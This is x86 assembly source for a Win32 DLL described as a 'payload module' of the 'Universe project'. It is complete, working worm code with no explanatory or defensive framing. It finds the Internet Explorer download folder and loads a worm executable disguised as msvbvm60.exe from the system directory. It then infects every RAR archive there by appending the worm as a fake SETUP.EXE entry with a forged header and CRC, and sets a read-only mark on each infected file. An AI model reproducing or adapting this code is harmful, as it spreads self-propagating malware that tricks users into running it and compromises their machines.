;payload module, part of Universe project.


.386p
.model	flat

include	..\win32api.inc
include	..\useful.inc


invoke	macro	api					;macro for API callz
	extrn	api:PROC				;declare API
	call	api					;call it...
endm


.data
	down_dir	db	MAX_PATH dup (?)	;buffer for directory
	WFD		WIN32_FIND_DATA	?		;file search buffer
	tmp		dd	?

.code
Start:	mov	ecx,[esp+8]
	dec	ecx
	jecxz	perform_action			;must be DLL_PROCESS_ATTACH (1)
	ret

perform_action:
	pushad
	@SEH_SetupFrame	<jmp	end_seh>

	mov	esi,offset down_dir
	call	@dData
	dd	MAX_PATH
@dData:	push	esi
	call	@dType
	dd	1
@dType:	@pushsz	'Download Directory'
	@pushsz	'Software\Microsoft\Internet Explorer'
	push	80000001h
	invoke	SHGetValueA			;get standard MSIEs download
	test	eax,eax				;directory path
	jne	end_seh

	push	esi
	invoke	SetCurrentDirectoryA		;switch to there

	call	get_main_crc			;calculate crc32 of the worm file

	mov	esi,offset WFD
	push	esi
	@pushsz	'*.rar'
	invoke	FindFirstFileA			;find some rar file
	inc	eax
	je	end_seh
	dec	eax
	xchg	eax,ebx
	mov	[fHandle],ebx
	lea	edi,[esi.WFD_szFileName]
l_ir:	call	infect_rar			;infect it
	push	esi
	push	ebx
	invoke	FindNextFileA			;find next
	dec	eax
	je	l_ir

	push	12345678h
fHandle = dword ptr $-4
	invoke	FindClose			;close search handle

	push	MEM_RELEASE
	push	0
	push	12345678h
lpWormMain = dword ptr $-4
	invoke	VirtualFree			;release the memory

end_seh:@SEH_RemoveFrame			;and quit
e_ir:	popad
	ret


infect_rar	Proc
	pushad
	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	0
	push	GENERIC_READ or GENERIC_WRITE
	push	edi
	invoke	CreateFileA			;open the file
	inc	eax
	je	e_ir
	dec	eax
	xchg	eax,ebx

	push	2
	push	0
	push	0
	push	ebx
	invoke	SetFilePointer			;go to EOF

	mov	esi,offset RARHeaderCRC+2
	push	end_RAR-RARHeader-2
	pop	edi
	call	CRC32                           ;calculate CRC32 of rar header
	mov	[RARHeaderCRC],ax

	push	0
	push	offset tmp
	push	end_RAR-RARHeader
	call	end_RAR
RARHeader:
RARHeaderCRC	dw	0
RARType		db	74h
RARFlags	dw	8000h
RARHSize        dw      end_RAR-RARHeader
RARCompressed	dd	2000h
RAROriginal	dd	2000h
RAROS		db	0
RARCRC32	dd	0
RARFileDateTime dd      12345678h
RARNeedVer	db	14h
RARMethod	db	30h
RARFNameSize    dw      end_RAR-RARName
RARAttrib	dd	0
RARName		db	'SETUP.EXE'
end_RAR:push	ebx
	invoke	WriteFile			;write the rar header

	push	0
	push	offset tmp
	push	12345678h
fileSize = dword ptr $-4
	push	[lpWormMain]
	push	ebx
	invoke	WriteFile			;write the worm

	push	ebx
	invoke	CloseHandle			;close the file

	push	FILE_ATTRIBUTE_READONLY
	push	offset WFD.WFD_szFileName
	invoke	SetFileAttributesA		;set already-infected mark
end_gmc:popad
	ret
infect_rar	EndP


;calculate crc32 of main module
get_main_crc	Proc
	pushad
	mov	edi,offset down_dir
	push	edi
	push	MAX_PATH
	push	edi
	invoke	GetSystemDirectoryA
	add	edi,eax
	mov	eax,'vsm\'
	stosd
	mov	eax,'6mvb'
	stosd
	mov	eax,'xe.0'
	stosd
	push	'e'
	pop	eax
	stosw					;create sysdir\msvbvm60.exe
	pop	edi				;filename

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	0
	push	GENERIC_READ
	push	edi
	invoke	CreateFileA			;open worm file
	inc	eax
	je	end_gmc
	dec	eax
	mov	[hFile],eax			;save handle

	push	0
	push	eax
	invoke	GetFileSize
	mov	[fileSize],eax
	mov	[RARCompressed],eax
	mov	[RAROriginal],eax
	push	eax

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	eax
	push	0
	invoke	VirtualAlloc			;allocate enough memory
	test	eax,eax
	pop	edx
	je	end_file
	xchg	eax,ebx
	mov	[lpWormMain],ebx

	push	edx
	push	0
	push	offset tmp
	push	edx
	push	ebx
	push	[hFile]
	invoke	ReadFile			;and copy there worm

	pop	edi
	mov	esi,ebx
	call	CRC32				;calculate its CRC32
	mov	[RARCRC32],eax
end_file:
	push	12345678h
hFile = dword ptr $-4
	invoke	CloseHandle			;and close the file
	popad
	ret
get_main_crc	EndP


CRC32	Proc
	push	ecx				;procedure for 
	push	edx				;calculating CRC32s
	push	ebx       			;at run-time
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret
CRC32	EndP
End	Start
